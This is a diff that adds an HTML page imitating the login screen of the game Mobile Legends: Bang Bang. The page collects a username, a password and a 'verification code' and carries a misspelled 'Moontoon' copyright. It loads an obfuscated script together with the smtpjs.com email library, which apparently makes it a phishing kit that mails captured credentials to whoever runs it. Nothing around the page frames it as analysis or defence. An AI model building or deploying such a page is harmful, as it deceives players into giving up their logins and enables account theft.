@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends: Bang Bang</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="icon" href="logo.png" >
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="linLogo">
+                
+                <div class="rightImg"><img id="chpic" src="img/logoNone.png" alt="none"  width="100%" height="100%"></div>
+                
+            </div>
+            <div class="loginFrm">
+                <div class="imgP"><img src="logo1.png" alt="logo" width="200px" height="110px"></div>
+                <div class="lin1">
+                    <div class="leftSide"><label for="userName">Username</label></div>
+                    <div class="rightSide"><input type="text" name="userName" id="userName"></div>
+                </div>
+                <div class="lin2">
+                    <div class="leftSide"><label for="passWord">Password</label></div>
+                    <div class="rightSide"><input type="password" name="passWord" id="passWord"></div>
+                    
+                    
+                </div>
+                <div class="lin3">
+                    <div class="leftSide"><label for="verifi">Verification Code</label></div>
+                    <div class="rightSide"><input style="width: 140px;" type="text" name="verifi" id="verifi"><button onclick="myTime()" id="btn_">Submit</button></div>
+                </div>
+                <div class="lin4">
+                    <div class="note">
+                        <p>Verification code will be sent to your in-game mailbox,vaild for 30 mins</p>
+                    </div>
+                    
+                    <button style="background-color: green;" id="loginBtn" onclick="checkValue()">Login</button>
+                </div>
+                <div class="copyRight">
+                    <p>©Copyright by Moontoon</p>
+                </div>
+            </div>
+            
+        </div>
+        
+    </div>
+
+    
+    <script src="javascript.obfuscated.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+</body>
+</html>
